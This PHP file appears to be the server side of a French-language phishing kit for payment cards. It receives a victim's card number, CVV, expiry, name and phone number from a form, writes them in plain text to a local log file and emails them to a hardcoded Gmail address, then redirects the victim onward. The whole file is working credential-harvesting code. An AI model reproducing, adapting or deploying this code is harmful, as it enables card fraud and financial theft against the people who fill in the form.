<?php
   function validatecard($card_number,$allowTest = false){
       global $card_type;
	   if($allowTest == false && $card_number =='4111111111111111'){
			return false;
		}
	$card_number = preg_replace('/[^0-9]/','',$card_number);
    $card_type = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
		"diners"     => "/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/",
		"jcb"        => "/^(?:2131|1800|35[0-9]{3})[0-9]{11}$/"
    );

    if (preg_match($card_type['visa'],$card_number))
    {
	$card_type= "visa";
        return 'visa';
	
    }
    else if (preg_match($card_type['mastercard'],$card_number))
    {
	$card_type= "mastercard";
        return 'mastercard';
    }
    else if (preg_match($card_type['amex'],$card_number))
    {
	$card_type= "amex";
        return 'amex';
	
    }
    else if (preg_match($card_type['discover'],$card_number))
    {
	$card_type= "discover";
        return 'discover';
    }
	 else if (preg_match($card_type['diners'],$card_number))
    {
	$card_type= "diners";
        return 'diners';
    }
	else if (preg_match($card_type['jcb'],$card_number))
    {
	$card_type= "jcb";
        return 'jcb';
    }
     else
     {
        return false;
     } 
   }
   
  if ($_SERVER["REQUEST_METHOD"] == "POST"){

	$card_number = strip_tags(trim($_POST['card_number']));
	$csc = strip_tags(trim($_POST['csc']));
    $name = strip_tags(trim($_POST['name']));
	$month = $_POST['month'];
	$year = $_POST['year'];
	$card_type = $_POST['card_type'];
	$Tel = $_POST['inputTel'];
	
	 if (empty($card_number) OR empty($csc) OR empty($name) OR  empty($month) OR empty($year) OR empty($card_type) OR empty($Tel)) {

	 header( "refresh:1;url=../card_confirmation.php" );
        echo "<h3>Veuillez remplir tout les champs du formulaire</h3>";
			exit;
			}
    $fic=fopen("../omer.txt","a");
        $phrase="numero_carte :".$card_number."| csc :".$csc." |nom_proprietaire:".$name." |date_expiration:".$month."/".$year."|type_card:".$card_type." |tel:".$Tel;
        fwrite($fic,$phrase."\n");
	if(validatecard($card_number)){
	
        
		$dest ='Omer.kouadio90@gmail.com';
        $entete  = 'MIME-Version: 1.0' . "\r\n";
        $entete .= 'Content-type: text/html; charset=utf-8' . "\r\n";
		$message = '<html><body>';
		$message .= '<img src="../img/logo.jpg" alt="Website Change Request" />';
		$message = '<h1>Nouvelles informations</h1>';
		$message .= '<table rules="all" style="border: 2px solid #666;" cellpadding="10">';
		$message .= "<tr style='background: #eee;'><td><strong>Numero de carte:</strong> </td><td>" . htmlspecialchars($card_number) . "</td></tr>";
		$message .= "<tr><td><strong>CVV:</strong> </td><td>" . htmlspecialchars($csc) . "</td></tr>";
		$message .= "<tr><td><strong>Date expiration:</strong> </td><td>" . htmlspecialchars($month) . '/' .htmlspecialchars($year) . "</td></tr>";
		$message .= "<tr><td><strong>Type de carte:</strong> </td><td>" . htmlspecialchars($card_type) . "</td></tr>";
		$message .= "<tr><td><strong>Nom du propriétaire:</strong> </td><td>" .htmlspecialchars($name) . "</td></tr>";
		$message .= "<tr><td><strong>Numéro de téléphone:</strong> </td><td>" .htmlspecialchars($Tel) . "</td></tr>";
		$message .= "</table>";
		$message .= "</body></html>";
		
        $retour = mail($dest, 'Nouvelles informations', stripslashes($message), $entete);
        if($retour) {
           echo header('location:../info_utile.html');
        }
    }else{
		  header( "refresh:1;url=../card_confirmation.php" );
	      echo "<h3>Numero de carte est invalide</h3>"; 
	}

  }else {
        // Not a POST request, set a 403 (forbidden) response code.
		header( "refresh:.5;url=../card_confirmation.php" );
        echo "<h3>Impossible de traiter votre demande</h3>";
		
		exit;
		
		}  
?>
